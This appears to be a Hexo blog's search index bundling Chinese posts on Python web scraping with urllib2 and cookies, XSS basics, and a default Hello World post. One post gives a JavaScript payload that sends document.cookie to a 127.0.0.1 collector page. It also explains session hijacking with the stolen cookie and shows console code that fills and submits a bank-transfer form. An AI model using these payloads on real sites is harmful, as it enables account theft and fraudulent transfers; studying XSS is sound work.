<?xml version="1.0" encoding="utf-8"?>
<search>
  
    
    <entry>
      <title><![CDATA[python爬虫的一些小知识点]]></title>
      <url>%2F2017%2F03%2F04%2Fpython%E7%88%AC%E8%99%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9%2F</url>
      <content type="text"><![CDATA[- 关于cookielib 1&gt;cookie:有一些网站在cookie未启用的时候无法浏览，而cookie是用于某些网站辨别用户身份，进行session跟踪而存储在 用户本地终端 上的数据（比如说有些网站需要登录后才能访问某个页面，在登录之前，你想抓取某个页面内容是不允许的。那么我们可以利用Urllib2库保存我们登录的Cookie，然后再抓取其他页面就达到目的了。） 2&gt;打开网页的console，刷新页面之后，在network中会有Request Headers，其中就有cookie 当我们(客户端）输入URL请求页面后，我们即给web服务端发送了一个要求（request），web server根据Request生产响应的response，发回给我们（客户端），然后解析Response的html，我们就可以看到页面 –当网站发送页面到客户端时（服务器发送给客户端），会发送Headers来描述HTTP事物，送回来的headers（response headers）中包含一些有cookie的文本。如果此时想要从相同的服务器返回其他页面（客户端请求其他页面），那么cookie就必须作为请求的handler（request handler）传送给服务器，这就意味着cookies会存储一些信息让服务器来识别你。 #其中一种获取网页的方式# cj =cookielib.CookieJar() opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj)) urllib2.install_opener(opener) response3 = urllib2.urlopen(url) print response3.getcode() print cj print response3.read() 关于CookieJar() cookielib.CookieJar用于存储cookie对象，此模块捕获cookie并在后续连接请教时重新发送，还可以用来处理包含cookie数据文件 关于opener和handlers 1&gt;opener:当你获取一个URL的时候，你就使用一个opener(一个urllib2.OpenerDirector的实例) 默认的opener也就是我们常用的urlopen。它是一个特殊的opener，传入的参数仅仅是url,data,timeout(可以注意到并没有cookie，说明在某些网页中无法使用这种方法抓取数据），如果我们需要用到cookie，就需要创建更一般的opener来实现对Cookie的设置 -自定义opener #使用build_opener() opener = urllib2.build_opener([handler1[handler2...]]) 参数handler是Handler实例，常用的有HTTPBasicAuthHandler、HTTPCookieProcessor、ProxyHandler等 ①修改http报头 import urllib2 opener = urllib2.build_opener() opener.addheaders = [(&apos;User-agent&apos;, &apos;Mozilla/5.0&apos;)] opener.open(url) ②install_opener(opener)安装不同的opener对象作为urlopen()使用的全局opener opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj)) urllib2.install_opener(opener) response3 = urllib2.urlopen(url) ③密码验证（HTTPBasicAuthHandler）HTTPBasicAuthHandler()处理程序可用add_password()来设置密码。 h.add_password(远程关联的名称,基URL,user,passwd) - import urllib2 auth=urllib2.HTTPBasicAuthHandler() auth.add_password(&apos;Administrator&apos;,&apos;http://www.example.com&apos;,&apos;Dave&apos;,&apos;123456&apos;) opener=urllib2.build_opener(auth) u=opener.open(URL) ④Cookie处理(HTTPCookieProcessor) import urllib2,cookielib cookie=cookielib.CookieJar() cookiehand=urllib2.HTTPCookieProcessor(cookie) opener=urllib2.build_opener(cookiehand) ⑤代理(ProxyHandler)-ProxyHandler(proxies)参数proxies是一个字典，将协议名称（http，ftp）等映射到相应代理服务器的URL。 proxy=ProxyHandler({&apos;http&apos;:&apos;http://someproxy.com:8080&apos;}) auth=HTTPBasicAuthHandler() auth.add_password() opener=build_opener(auth,proxy) - 实例爬虫 1.确定抓取的目标：-通过网页”检查元素”的操作可以确定该网页的url格式，数据格式和网页编码 2.分析目标 3.编写代码在一个包中写入：总程序调度文件、URL管理器文件、HTML下载器文件、HTML解析器文件、HTML输出器文件]]></content>
    </entry>

    
    <entry>
      <title></title>
      <url>%2F2017%2F02%2F19%2Fpython%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%2F</url>
      <content type="text"><![CDATA[title:Python 数据采集- 环境：pycharm、python 2.7（自带urllib） install soupbeautiful -urllib的使用方法 import urllib resp = urllib.urlopen(&quot;http://www.baidu.com&quot;)//网址 print (resp.read().decode(&quot;utf-8&quot;)) 获取该网址的信息 -使用post的方法获取信息 在一个网页中，会有标示信号User-Agent来证明是一个网页而并不是爬虫而要用post的方法获取信息，需要在Doc中（刷新F5，打开F12）获取一下信息： Status Code://响应结果 User-Agent://使用的浏览器 origin://来源 Form data://from data下面就是请求的内容，要将请求的内容复制下来，并且放入post语句中]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[xss攻击类型和方式]]></title>
      <url>%2F2017%2F02%2F15%2Fxss%E8%AF%95%E9%AA%8C%2F</url>
      <content type="text"><![CDATA[&gt; 攻击： 1.盗取用户账号 2.非法转账 3.篡改系统信息 4.网站挂马 - 盗取用户账号 var cookie = document.cookie window.location.href = &apos;http://127.0.0.1/index.php?cookie=&apos;+cookie; 使用document对象里面的cookie属性去获得浏览器里的cookie值使用window.location下面的href属性，赋值。使得浏览器跳转到127.0.0.1下面的index.php页面中，把拿到的cookie值也传递到页面中。 - 1.如何获得cookie值 a.在resource的cookie中 b.在控制台consle中输入document.cookie查看cookie值 - 2.获得cookie值如何盗取用户账号 在用户登录的时候，用户的用户名和密码会被传送至服务器端，服务器做校验，若没有问题，就会产生一个文件，文件名被转换成相应的字符串，当服务器发生响应的时候，该字符串会被携带上并且一同被存储到cookie中。同时再次响应的时候会根据cookie的值寻找该文件，取得该文件后就知道是哪个用户请求登陆。 若在我们登陆的时候携带上别人的cookie，就能找到别人的文件，就可以通过cookie数据成功模拟别人的数据操控系统。 - 3.获取cookie数据 cookie数据被送到了index.php文件，然后该文件将cookie的值都存入了cookie.txt文件中(然而里面一般没有登录的cookie数据，由于我们要获取的是httponly cookie，若cookie为httponly则无法通过JS读取该cookie的值) 当我们刷新页面的时候，会重新提交cookie，若能拿到请求数据，就可以获得cookie的数据。用Network(用于监听浏览器和服务器之间的数据)获取请求数据 - 4.获取用户信息 a.在控制台中更改cookie信息(将现在的cookie信息重新赋值为从network中获取到的cookie信息) b.刷新，进入页面，获取了权限 - 非法转账 在consloe中输入: document.getElementById(&apos;ipt-search-key&apos;).value = &apos;#收款人账号&apos;; document.getElementById(&apos;amount&apos;).value = &apos;#金额&apos;; document.getElementById(&apos;reason&apos;).value = &apos;#支付说明&apos;; document.getElementByClassName(&apos;ui-button-text&apos;)[0].click() //确认按钮 - 如何注入代码到页面中（xss之后台注入） 当别人打开自己的后台界面的时候（自己提交的数据只有自己能看得到，也就是并不是一个公共的平台）若往后台界面注入JS代码那么被注入的也是自己，所以此时要使用反射性xss攻击。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[xss注入的基础知识]]></title>
      <url>%2F2017%2F02%2F14%2Fxss%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%2F</url>
      <content type="text"><![CDATA[#XSS注入基础知识# xss攻击是什么? 代码注入形式的一种安全漏洞攻击 通过注入恶意指令代码到网页，是用户执行攻击者所制造的恶意网页 攻击成功后，攻击者可能得到更高的用户权限 xss攻击的基本原理 在web的世界里有各种各样的语言，于是乎对于语句的解析大家各不相同，有一些语句在一种语言里是合法的，但是在另外一种语言里是非法的。这种二义性使得黑客可以用代码注入的方式进行攻击——将恶意代码注入合法代码里隐藏起来，再诱发恶意代码，从而进行各种各样的非法活动。只要破坏跨层协议的数据/指令的构造，我们就能攻击。 xss的基本实现思路 通过在网页上发布评论，提交还有类似于JS或者html或者Java，VBScript，ActiveX，Flash的内容文本。时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本，从而被攻击。 xss的类型 反射性xss --被动的非持久性xss 通过点击带有攻击性的url链接，服务器解析后响应，在返回的响应内容中隐藏和嵌入攻击者的XSS代码，被浏览器执行，从而攻击用户。 持久型xss 主动提交恶意数据到服务器，攻击者在数据中嵌入代码，这样当其他用户请求后，服务器从数据库中查询数据并发给用户，用户浏览此类页面时就可能受到攻击。可以描述为:恶意用户的HTML或JS输入服务器-&gt;进入数据库-&gt;服务器响应时查询数据库-&gt;用户浏览器。 DOM-based XSS 基于DOM的XSS，通过对具体DOM代码进行分析，根据实际情况构造dom节点进行XSS跨站脚本攻击。注：domxss取决于输出位置，并不取决于输出环境，因此domxss既有可能是反射型的，也有可能是存储型的。dom-based与非dom-based，反射和存储是两个不同的分类标准。 转载自http://www.imooc.com/m/wap/article/detail.html?aid=13553 对于跨站脚本攻击（XSS攻击）的理解和总结]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Hello World]]></title>
      <url>%2F2017%2F02%2F12%2Fhello-world%2F</url>
      <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
    </entry>

    
  
  
</search>
